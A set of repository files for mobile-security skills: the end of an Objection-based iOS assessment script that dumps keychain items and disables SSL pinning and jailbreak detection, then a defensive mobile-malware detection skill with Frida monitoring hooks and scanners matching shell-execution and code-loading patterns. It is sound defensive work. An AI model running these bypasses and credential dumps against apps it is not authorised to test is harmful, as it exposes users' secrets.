                current_item["account"] = line.split(":", 1)[-1].strip()
            elif "Data" in line and ":" in line:
                data = line.split(":", 1)[-1].strip()
                current_item["data_preview"] = data[:50] + "..." if len(data) > 50 else data
                current_item["data_length"] = len(data)

        if current_item:
            items.append(current_item)

        finding = {
            "check": "keychain_dump",
            "category": "MASVS-STORAGE",
            "owasp_mobile": "M9",
            "items_found": len(items),
            "items": items[:20],
            "severity": "HIGH" if items else "INFO",
            "description": f"Found {len(items)} keychain items accessible to the application",
        }
        self.findings.append(finding)
        return finding

    def check_nsuserdefaults(self) -> dict:
        """Inspect NSUserDefaults for sensitive data."""
        output = self._run_objection_command("ios nsuserdefaults get")
        sensitive_patterns = [
            "password", "token", "secret", "key", "auth",
            "session", "credential", "api_key", "apikey",
        ]

        sensitive_entries = []
        for line in output.split("\n"):
            line_lower = line.lower()
            for pattern in sensitive_patterns:
                if pattern in line_lower:
                    sensitive_entries.append(line.strip())
                    break

        finding = {
            "check": "nsuserdefaults",
            "category": "MASVS-STORAGE",
            "owasp_mobile": "M9",
            "sensitive_entries": len(sensitive_entries),
            "entries": sensitive_entries[:10],
            "severity": "HIGH" if sensitive_entries else "PASS",
            "description": f"Found {len(sensitive_entries)} potentially sensitive NSUserDefaults entries",
        }
        self.findings.append(finding)
        return finding

    def check_ssl_pinning(self) -> dict:
        """Assess SSL pinning implementation."""
        output = self._run_objection_command("ios sslpinning disable")
        pinning_detected = "pinning" in output.lower() or "hook" in output.lower()

        finding = {
            "check": "ssl_pinning",
            "category": "MASVS-NETWORK",
            "owasp_mobile": "M5",
            "pinning_detected": pinning_detected,
            "bypass_output": output[:500],
            "severity": "MEDIUM" if not pinning_detected else "INFO",
            "description": "SSL pinning " + ("detected and bypassed" if pinning_detected else "not detected"),
        }
        self.findings.append(finding)
        return finding

    def check_jailbreak_detection(self) -> dict:
        """Assess jailbreak detection implementation."""
        output = self._run_objection_command("ios jailbreak disable")
        detection_found = "hook" in output.lower() or "bypass" in output.lower()

        finding = {
            "check": "jailbreak_detection",
            "category": "MASVS-RESILIENCE",
            "owasp_mobile": "M7",
            "detection_implemented": detection_found,
            "bypass_output": output[:500],
            "severity": "MEDIUM" if not detection_found else "INFO",
            "description": "Jailbreak detection " + ("found" if detection_found else "not found or not implemented"),
        }
        self.findings.append(finding)
        return finding

    def search_sensitive_memory(self) -> dict:
        """Search app memory for sensitive strings."""
        patterns = ["password", "Bearer ", "eyJ", "api_key", "secret"]
        memory_findings = []

        for pattern in patterns:
            output = self._run_objection_command(f'memory search "{pattern}" --string')
            matches = output.count("Found")
            if matches > 0:
                memory_findings.append({
                    "pattern": pattern,
                    "matches": matches,
                })

        finding = {
            "check": "memory_search",
            "category": "MASVS-STORAGE",
            "owasp_mobile": "M9",
            "patterns_with_matches": len(memory_findings),
            "details": memory_findings,
            "severity": "HIGH" if memory_findings else "PASS",
            "description": f"Found sensitive patterns in memory for {len(memory_findings)} search terms",
        }
        self.findings.append(finding)
        return finding

    def get_app_info(self) -> dict:
        """Gather basic app information."""
        output = self._run_objection_command("ios info binary")
        env_output = self._run_objection_command("env")

        return {
            "bundle_id": self.bundle_id,
            "binary_info": output[:1000],
            "environment": env_output[:1000],
        }

    def generate_report(self) -> dict:
        """Generate consolidated assessment report."""
        severity_counts = {"HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0, "PASS": 0}
        for f in self.findings:
            sev = f.get("severity", "INFO")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        return {
            "assessment": {
                "target": self.bundle_id,
                "date": datetime.now().isoformat(),
                "tool": "Objection (Frida-powered)",
                "type": "iOS Runtime Security Assessment",
            },
            "summary": {
                "total_checks": len(self.findings),
                "severity_breakdown": severity_counts,
                "critical_findings": [
                    f for f in self.findings if f.get("severity") in ("HIGH", "CRITICAL")
                ],
            },
            "findings": self.findings,
        }


def main():
    parser = argparse.ArgumentParser(
        description="Objection iOS Security Assessment Automation"
    )
    parser.add_argument("--bundle-id", required=True, help="iOS app bundle identifier")
    parser.add_argument("--device-id", help="Device UDID for targeting specific device")
    parser.add_argument("--output", default="objection_report.json", help="Output report path")
    parser.add_argument("--checks", nargs="+",
                        default=["keychain", "nsuserdefaults", "ssl", "jailbreak", "memory"],
                        help="Checks to run")
    args = parser.parse_args()

    assessor = ObjectionAssessor(args.bundle_id, args.device_id)

    # Verify connectivity
    connectivity = assessor.check_frida_connectivity()
    if not connectivity["connected"]:
        print("[-] ERROR: Cannot connect to device via Frida")
        print("    Ensure Frida server is running on device or IPA is patched")
        sys.exit(1)

    print(f"[+] Connected to device. Target running: {connectivity['target_running']}")

    # Run selected checks
    check_map = {
        "keychain": assessor.dump_keychain,
        "nsuserdefaults": assessor.check_nsuserdefaults,
        "ssl": assessor.check_ssl_pinning,
        "jailbreak": assessor.check_jailbreak_detection,
        "memory": assessor.search_sensitive_memory,
    }

    for check in args.checks:
        if check in check_map:
            print(f"[*] Running check: {check}")
            result = check_map[check]()
            print(f"    Severity: {result['severity']} - {result['description']}")

    # Generate report
    report = assessor.generate_report()

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] Report saved: {args.output}")

    # Summary
    high_count = report["summary"]["severity_breakdown"].get("HIGH", 0)
    if high_count > 0:
        print(f"[!] {high_count} HIGH severity findings require attention")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/SKILL.md =====
---
name: detecting-mobile-malware-behavior
description: 'Detects and analyzes malicious behavior in mobile applications through
  behavioral analysis, permission abuse detection, network traffic monitoring, and
  dynamic instrumentation. Use when analyzing suspicious mobile applications for data
  exfiltration, command-and-control communication, credential stealing, SMS interception,
  or other malware indicators. Activates for requests involving mobile malware analysis,
  app behavior monitoring, trojan detection, or suspicious app investigation.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- malware-analysis
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1003
mitre_f3:
  version: '1.1'
  tactics:
  - positioning
  - execution
  - initial-access
  techniques:
  - id: T1453
    name: Abuse Accessibility Features
    tactic: positioning
    source: attack
  - id: F1003
    name: Abuse SMS verification
    tactic: execution
    source: f3
  - id: T1113
    name: Screen Capture
    tactic: positioning
    source: attack
  - id: T1219
    name: Remote Access Tools
    tactic: positioning
    source: attack
  - id: F1002.001
    name: 'Abuse of Public-Facing API: Mobile API Abuse'
    tactic: positioning
    source: f3
---
# Detecting Mobile Malware Behavior

## When to Use

Use this skill when:
- Analyzing suspicious mobile applications submitted by users or discovered during incident response
- Monitoring enterprise mobile fleet for malicious app indicators
- Performing malware triage on APK/IPA samples
- Investigating data exfiltration or unauthorized device access from mobile apps

**Do not use** this skill to create, enhance, or distribute malware. This skill is for defensive analysis only.

## Prerequisites

- Isolated analysis environment (dedicated device or emulator, not connected to production networks)
- MobSF for automated static+dynamic analysis
- Frida/Objection for runtime behavior monitoring
- Wireshark/tcpdump for network traffic capture
- Android emulator (AVD) or Genymotion for safe execution
- VirusTotal API key for hash lookups

## Workflow

### Step 1: Static Indicator Analysis

```bash
# Hash the sample
sha256sum suspicious.apk

# Check VirusTotal
curl -s "https://www.virustotal.com/api/v3/files/<SHA256>" \
  -H "x-apikey: <VT_API_KEY>" | jq '.data.attributes.last_analysis_stats'

# Extract permissions from AndroidManifest.xml
aapt dump permissions suspicious.apk

# High-risk permission combinations:
# READ_SMS + INTERNET = SMS stealer
# RECEIVE_SMS + SEND_SMS = SMS interceptor/banker trojan
# ACCESSIBILITY_SERVICE + INTERNET = overlay attack capability
# CAMERA + RECORD_AUDIO + INTERNET = spyware
# DEVICE_ADMIN + INTERNET = ransomware capability
# READ_CONTACTS + INTERNET = contact exfiltration
```

### Step 2: MobSF Automated Malware Scan

```bash
# Upload to MobSF
curl -F "file=@suspicious.apk" http://localhost:8000/api/v1/upload \
  -H "Authorization: <API_KEY>"

# Review malware indicators in report:
# - Hardcoded C2 server addresses
# - Dynamic code loading (DexClassLoader)
# - Reflection-based API calls (to evade static analysis)
# - Encrypted/obfuscated payloads
# - Root detection (malware often checks for root)
# - Anti-emulator checks (malware evades sandbox)
```

### Step 3: Network Behavior Monitoring

```bash
# Start packet capture on emulator
tcpdump -i any -w malware_traffic.pcap

# Or use mitmproxy for HTTP/HTTPS
mitmproxy --mode transparent

# Monitor for:
# - DNS lookups to suspicious/newly registered domains
# - Connections to known C2 infrastructure
# - Data exfiltration patterns (large POST requests)
# - Beaconing behavior (regular interval connections)
# - Non-standard ports and protocols
# - Domain Generation Algorithm (DGA) patterns
```

### Step 4: Runtime Behavior Monitoring with Frida

```javascript
// monitor_malware.js - Comprehensive behavior monitoring
Java.perform(function() {
    // Monitor SMS access
    var SmsManager = Java.use("android.telephony.SmsManager");
    SmsManager.sendTextMessage.overload("java.lang.String", "java.lang.String",
        "java.lang.String", "android.app.PendingIntent", "android.app.PendingIntent")
        .implementation = function(dest, sc, text, sent, delivery) {
            console.log("[SMS] Sending to: " + dest + " Text: " + text);
            // Allow or block based on analysis needs
            return this.sendTextMessage(dest, sc, text, sent, delivery);
        };

    // Monitor file operations
    var FileOutputStream = Java.use("java.io.FileOutputStream");
    FileOutputStream.$init.overload("java.lang.String").implementation = function(path) {
        console.log("[FILE-WRITE] " + path);
        return this.$init(path);
    };

    // Monitor network connections
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("[NET] " + this.toString());
        return this.openConnection();
    };

    // Monitor dynamic code loading
    var DexClassLoader = Java.use("dalvik.system.DexClassLoader");
    DexClassLoader.$init.implementation = function(dexPath, optDir, libPath, parent) {
        console.log("[DEX-LOAD] Loading: " + dexPath);
        return this.$init(dexPath, optDir, libPath, parent);
    };

    // Monitor command execution
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("java.lang.String").implementation = function(cmd) {
        console.log("[EXEC] " + cmd);
        return this.exec(cmd);
    };

    // Monitor camera/audio access
    var Camera = Java.use("android.hardware.Camera");
    Camera.open.overload("int").implementation = function(id) {
        console.log("[CAMERA] Camera opened: " + id);
        return this.open(id);
    };

    // Monitor content provider access (contacts, call log)
    var ContentResolver = Java.use("android.content.ContentResolver");
    ContentResolver.query.overload("android.net.Uri", "[Ljava.lang.String;",
        "java.lang.String", "[Ljava.lang.String;", "java.lang.String")
        .implementation = function(uri, proj, sel, selArgs, sort) {
            console.log("[QUERY] " + uri.toString());
            return this.query(uri, proj, sel, selArgs, sort);
        };

    console.log("[*] Malware behavior monitor active");
});
```

### Step 5: Classify Malware Type

Based on observed behaviors, classify the sample:

| Behavior Pattern | Malware Type |
|-----------------|-------------|
| SMS interception + C2 communication | Banking Trojan |
| Camera/mic access + data upload | Spyware/Stalkerware |
| File encryption + ransom note display | Mobile Ransomware |
| Ad injection + click fraud traffic | Adware |
| Root exploit + persistence | Rootkit |
| Contact harvesting + SMS spam | Worm/SMS Spammer |
| Overlay attacks + credential capture | Credential Stealer |
| Crypto mining network activity | Cryptojacker |

## Key Concepts

| Term | Definition |
|------|-----------|
| **Dynamic Code Loading** | Loading executable code at runtime from external sources, commonly used by malware to evade static analysis |
| **C2 Beacon** | Regular network check-in from malware to command-and-control server, identifiable by periodic timing patterns |
| **DGA** | Domain Generation Algorithm creating pseudo-random domain names for resilient C2 infrastructure |
| **Overlay Attack** | Drawing fake UI over legitimate apps to capture credentials, requiring SYSTEM_ALERT_WINDOW permission |
| **Anti-Emulator** | Techniques malware uses to detect sandbox/emulator environments and suppress malicious behavior |

## Tools & Systems

- **MobSF**: Automated static and dynamic analysis for initial malware triage
- **VirusTotal**: Multi-engine malware scanning and hash reputation lookup
- **Frida**: Runtime behavior monitoring through method hooking
- **Wireshark**: Network traffic analysis for C2 communication patterns
- **Cuckoo Sandbox / CuckooDroid**: Automated malware analysis sandbox for Android samples

## Common Pitfalls

- **Anti-analysis evasion**: Sophisticated malware detects emulators, debuggers, and Frida. Use hardware devices and stealthy Frida configurations for accurate analysis.
- **Time-delayed payloads**: Some malware activates only after a delay or specific trigger. Monitor for extended periods and simulate various conditions.
- **Encrypted C2**: Malware using encrypted communications requires TLS interception or memory inspection to observe payload content.
- **Multi-stage payloads**: Initial APK may be benign; malicious payload downloads later. Monitor for dynamic code loading and file downloads.

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/assets/template.md =====
# Mobile Malware Analysis Report

## Sample Information
| Field | Value |
|-------|-------|
| File Name | [NAME] |
| SHA256 | [HASH] |
| File Size | [SIZE] |
| Package Name | [PACKAGE] |
| VirusTotal Detection | [N]/[TOTAL] engines |
| Risk Level | [CRITICAL/HIGH/MEDIUM/LOW] |

## Permission Analysis
| Permission | Risk | Malware Indicator |
|-----------|------|-------------------|
| [PERMISSION] | [LEVEL] | [DESCRIPTION] |

## Behavioral Indicators
| Behavior | Detected | Malware Type |
|----------|----------|-------------|
| SMS Interception | [YES/NO] | Banking Trojan |
| Camera/Audio | [YES/NO] | Spyware |
| Dynamic DEX Loading | [YES/NO] | Dropper |
| C2 Communication | [YES/NO] | General Malware |
| File Encryption | [YES/NO] | Ransomware |

## IOCs
| Type | Value | Context |
|------|-------|---------|
| Domain | [DOMAIN] | C2 Server |
| IP | [IP] | C2 Infrastructure |
| Hash | [HASH] | Payload |

## Recommendations
1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/references/api-reference.md =====
# API Reference: Detecting Mobile Malware Behavior

## Android Dangerous Permissions

| Permission | Risk | Abuse Scenario |
|------------|------|---------------|
| SEND_SMS | HIGH | Premium rate SMS fraud |
| READ_SMS | HIGH | OTP/2FA theft |
| BIND_ACCESSIBILITY_SERVICE | CRITICAL | Screen scraping, keylogging |
| BIND_DEVICE_ADMIN | CRITICAL | Device lockout, ransomware |
| INSTALL_PACKAGES | CRITICAL | Dropper functionality |
| SYSTEM_ALERT_WINDOW | HIGH | Overlay phishing attacks |

## Android Analysis Tools

```bash
# Extract permissions from APK
aapt dump permissions app.apk

# Decompile APK
apktool d app.apk -o output_dir/

# Decompile to Java source
jadx app.apk -d java_output/

# Run MobSF scan
docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

## Suspicious API Patterns

```python
# Dynamic code loading
r"DexClassLoader|PathClassLoader"
# Shell execution
r"Runtime\.exec|ProcessBuilder"
# Device fingerprinting
r"TelephonyManager\.getDeviceId"
```

## MobSF REST API

```python
import requests
# Upload APK
resp = requests.post("http://localhost:8000/api/v1/upload",
    files={"file": open("app.apk", "rb")},
    headers={"Authorization": API_KEY})

# Get scan results
resp = requests.post("http://localhost:8000/api/v1/scan",
    data={"hash": file_hash},
    headers={"Authorization": API_KEY})
```

## Android Broadcast Receivers (Persistence)

| Action | Malware Use |
|--------|-------------|
| BOOT_COMPLETED | Auto-start on reboot |
| SMS_RECEIVED | SMS interception |
| PHONE_STATE | Call monitoring |
| CONNECTIVITY_CHANGE | Network-triggered C2 |

## CLI Usage

```bash
python agent.py --apk suspicious.apk
python agent.py --source-dir jadx_output/
python agent.py --apk app.apk --source-dir decompiled/
```

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/references/standards.md =====
# Standards Reference: Mobile Malware Detection

## OWASP Mobile Top 10 2024
| ID | Risk | Malware Relevance |
|----|------|-------------------|
| M2 | Inadequate Supply Chain Security | Trojanized apps, repackaged malware |
| M8 | Security Misconfiguration | Excessive permissions enabling malware |

## NIST SP 800-163 Rev 1
- Section 5: Mobile app vetting for malware indicators
- Section 6: Enterprise mobile device management for malware prevention

## MITRE ATT&CK Mobile Matrix
| Tactic | Technique | Indicator |
|--------|-----------|-----------|
| Initial Access | T1444: Masquerade as Legitimate App | App name/icon spoofing |
| Collection | T1412: Capture SMS Messages | SMS permission + network |
| Exfiltration | T1437: Standard Application Layer Protocol | HTTP POST to C2 |
| Command and Control | T1437.001: Web Protocols | HTTPS beaconing |
| Impact | T1471: Data Encrypted for Impact | File encryption + ransom |

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/references/workflows.md =====
# Workflows: Mobile Malware Detection

## Workflow 1: Malware Triage Pipeline
```
[Receive sample] --> [Hash & VirusTotal check] --> [Known malware?]
                                                    /            \
                                              [Yes: Report]  [No: Continue]
                                                                   |
                                              [MobSF static scan] --> [Permission analysis]
                                                                   |
                                              [Dynamic execution in sandbox]
                                              [Network monitoring]
                                              [Behavior monitoring with Frida]
                                                                   |
                                              [Classify malware type]
                                              [Extract IOCs (domains, IPs, hashes)]
                                              [Generate report]
```

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/scripts/agent.py =====
#!/usr/bin/env python3
"""Mobile malware behavior detection agent.

Analyzes Android APK manifests and iOS app metadata for suspicious permissions,
dangerous API usage, and known malware behavioral patterns.
"""

import argparse
import json
import re
import subprocess
import zipfile
from pathlib import Path
from datetime import datetime

DANGEROUS_ANDROID_PERMISSIONS = {
    "android.permission.SEND_SMS": ("HIGH", "Can send SMS (premium rate fraud)"),
    "android.permission.READ_SMS": ("HIGH", "Reads SMS (OTP theft)"),
    "android.permission.RECEIVE_SMS": ("HIGH", "Intercepts SMS"),
    "android.permission.READ_CONTACTS": ("MEDIUM", "Reads contacts"),
    "android.permission.RECORD_AUDIO": ("HIGH", "Records audio"),
    "android.permission.CAMERA": ("MEDIUM", "Camera access"),
    "android.permission.READ_CALL_LOG": ("HIGH", "Reads call logs"),
    "android.permission.ACCESS_FINE_LOCATION": ("MEDIUM", "Fine GPS location"),
    "android.permission.WRITE_EXTERNAL_STORAGE": ("LOW", "Write to external storage"),
    "android.permission.INSTALL_PACKAGES": ("CRITICAL", "Can install other apps"),
    "android.permission.REQUEST_INSTALL_PACKAGES": ("HIGH", "Request app install"),
    "android.permission.SYSTEM_ALERT_WINDOW": ("HIGH", "Overlay attacks"),
    "android.permission.BIND_ACCESSIBILITY_SERVICE": ("CRITICAL", "Accessibility abuse"),
    "android.permission.BIND_DEVICE_ADMIN": ("CRITICAL", "Device admin control"),
    "android.permission.READ_PHONE_STATE": ("MEDIUM", "Reads device identifiers"),
    "android.permission.PROCESS_OUTGOING_CALLS": ("HIGH", "Intercepts outgoing calls"),
}

SUSPICIOUS_RECEIVERS = [
    "BOOT_COMPLETED", "SMS_RECEIVED", "PHONE_STATE",
    "NEW_OUTGOING_CALL", "PACKAGE_ADDED", "CONNECTIVITY_CHANGE",
]

MALWARE_API_PATTERNS = [
    (r"DexClassLoader|PathClassLoader", "HIGH", "Dynamic code loading"),
    (r"Runtime\.exec|ProcessBuilder", "HIGH", "Command execution"),
    (r"TelephonyManager\.getDeviceId", "MEDIUM", "Device fingerprinting"),
    (r"Base64\.decode.*exec", "CRITICAL", "Encoded payload execution"),
    (r"loadLibrary|System\.load", "MEDIUM", "Native library loading"),
    (r"Cipher.*AES.*encrypt", "LOW", "Encryption (possible ransomware)"),
    (r"javax\.crypto", "LOW", "Cryptographic operations"),
    (r"HttpURLConnection|OkHttp", "LOW", "Network communication"),
    (r"getRuntime\(\)\.exec", "HIGH", "Shell command execution"),
]


def analyze_apk_manifest(apk_path):
    findings = []
    permissions = []
    try:
        result = subprocess.run(
            ["aapt", "dump", "permissions", apk_path],
            capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            for line in result.stdout.split("\n"):
                perm_match = re.search(r"uses-permission.*'([^']+)'", line)
                if perm_match:
                    perm = perm_match.group(1)
                    permissions.append(perm)
                    if perm in DANGEROUS_ANDROID_PERMISSIONS:
                        sev, desc = DANGEROUS_ANDROID_PERMISSIONS[perm]
                        findings.append({
                            "type": "dangerous_permission",
                            "permission": perm,
                            "severity": sev,
                            "description": desc,
                        })
    except (FileNotFoundError, subprocess.TimeoutExpired):
        try:
            with zipfile.ZipFile(apk_path, 'r') as z:
                if "AndroidManifest.xml" in z.namelist():
                    findings.append({"note": "Binary manifest found, use aapt or apktool to decode"})
        except zipfile.BadZipFile:
            findings.append({"error": "Invalid APK file"})

    return {"permissions": permissions, "findings": findings}


def scan_decompiled_source(source_dir):
    findings = []
    source_path = Path(source_dir)
    for java_file in source_path.rglob("*.java"):
        try:
            content = java_file.read_text(encoding="utf-8", errors="replace")
            for pattern, severity, desc in MALWARE_API_PATTERNS:
                matches = re.findall(pattern, content)
                if matches:
                    findings.append({
                        "type": "suspicious_api",
                        "file": str(java_file),
                        "pattern": desc,
                        "match_count": len(matches),
                        "severity": severity,
                    })
        except OSError:
            continue
    for smali_file in source_path.rglob("*.smali"):
        try:
            content = smali_file.read_text(encoding="utf-8", errors="replace")
            if "Landroid/app/admin/DeviceAdminReceiver" in content:
                findings.append({
                    "type": "device_admin",
                    "file": str(smali_file),
                    "severity": "CRITICAL",
                    "description": "App registers as device administrator",
                })
        except OSError:
            continue
    return findings


def calculate_risk(findings):
    score = 0
    for f in findings:
        sev = f.get("severity", "LOW")
        score += {"CRITICAL": 30, "HIGH": 15, "MEDIUM": 5, "LOW": 2}.get(sev, 0)
    risk = "CRITICAL" if score >= 80 else "HIGH" if score >= 40 else \
           "MEDIUM" if score >= 15 else "LOW"
    return {"score": min(score, 100), "risk_level": risk}


def main():
    parser = argparse.ArgumentParser(description="Mobile Malware Behavior Detector")
    parser.add_argument("--apk", help="Path to APK file")
    parser.add_argument("--source-dir", help="Path to decompiled source directory")
    args = parser.parse_args()

    results = {"timestamp": datetime.utcnow().isoformat() + "Z", "findings": []}

    if args.apk:
        apk_results = analyze_apk_manifest(args.apk)
        results["permissions"] = apk_results["permissions"]
        results["findings"].extend(apk_results["findings"])

    if args.source_dir:
        results["findings"].extend(scan_decompiled_source(args.source_dir))

    results["risk"] = calculate_risk(results["findings"])
    results["total_findings"] = len(results["findings"])
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-mobile-malware-behavior/scripts/process.py =====
#!/usr/bin/env python3
"""
Mobile Malware Behavior Analyzer

Performs static indicator analysis on Android APK files to detect malware behaviors.
Checks permissions, code patterns, and VirusTotal reputation.

Usage:
    python process.py --apk suspicious.apk [--vt-key API_KEY] [--output report.json]
"""

import argparse
import hashlib
import json
import subprocess
import sys
import zipfile
import re
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None

DANGEROUS_PERMISSIONS = {
    "android.permission.READ_SMS": "SMS access - banking trojan indicator",
    "android.permission.RECEIVE_SMS": "SMS interception - banking trojan indicator",
    "android.permission.SEND_SMS": "SMS sending - premium SMS fraud indicator",
    "android.permission.CAMERA": "Camera access - spyware indicator",
    "android.permission.RECORD_AUDIO": "Microphone access - spyware indicator",
